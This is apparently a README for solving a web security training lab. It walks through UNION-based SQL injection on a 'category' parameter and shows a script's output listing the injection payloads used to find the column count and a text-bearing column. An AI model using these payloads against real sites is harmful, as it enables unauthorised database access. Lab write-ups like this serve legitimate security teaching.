## Hack Steps

1. Inject payload into 'category' query parameter to determine the number of columns.
2. Add one additional null column at a time.
3. Repeat this process, increasing the number of columns until you receive a valid response.
4. After determining the number of columns, replace each column with the desired text one at a time.
5. Repeat this process until you receive a valid response.

## Run Script

1. Change the URL of the lab
2. Start script

```
~$ python main.py
```

## Expected Output

```
⦗#⦘ Injection parameter: category
⦗#⦘ Desired text: 67doLF
❯❯ Trying payload: ' UNION SELECT null-- -
❯❯ Trying payload: ' UNION SELECT null, null-- -
❯❯ Trying payload: ' UNION SELECT null, null, null-- -
⦗#⦘ Number of columns: 3
❯❯ Trying payload: ' UNION SELECT '67doLF', null, null-- -
❯❯ Trying payload: ' UNION SELECT null, '67doLF', null-- -
⦗#⦘ the column containing text: 2
🗹 The lab should be marked now as solved
```
